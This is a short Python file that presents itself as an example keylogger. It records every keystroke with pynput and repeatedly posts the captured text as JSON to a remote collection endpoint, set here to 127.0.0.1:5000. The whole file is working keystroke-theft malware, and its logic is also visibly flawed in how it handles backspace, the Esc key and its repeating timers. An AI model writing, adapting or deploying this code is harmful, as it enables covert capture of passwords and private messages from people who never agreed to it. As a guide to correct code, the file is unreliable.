#This code is an example of keylogger
#https://github.com/amiroooamiran/Malware-with-python/
from pynput import keyboard
import requests
import json
import threading

# Global variables
text = ""
ip_address = "127.0.0.1"
port_number = "5000"
time_interval = 10

def send_post_request():
    try:
        payload = json.dumps({"keyboardData": text})
        url = f"http://{ip_address}:{port_number}/upload"
        headers = {"Content-Type": "application/json"}
        requests.post(url, data=payload, headers=headers)
        
        # Set up a timer for the next request
        timer = threading.Timer(time_interval, send_post_request)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request: {e}")

def on_press(key):
    global text

    special_keys = {
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.space: " ",
        keyboard.Key.shift: "",
        keyboard.Key.backspace: "" if len(text) == 0 else text[:-1],
        keyboard.Key.ctrl_l: "",
        keyboard.Key.ctrl_r: "",
        keyboard.Key.esc: False,
    }

    if key in special_keys:
        key_value = special_keys[key]
    else:
        key_value = str(key).strip("'")

    text += key_value

    # Handle sending the request for each key press
    send_post_request()

    # Stop the listener if the Esc key is pressed
    return key != keyboard.Key.esc

with keyboard.Listener(on_press=on_press) as listener:
    # Start the initial request
    send_post_request()
    listener.join()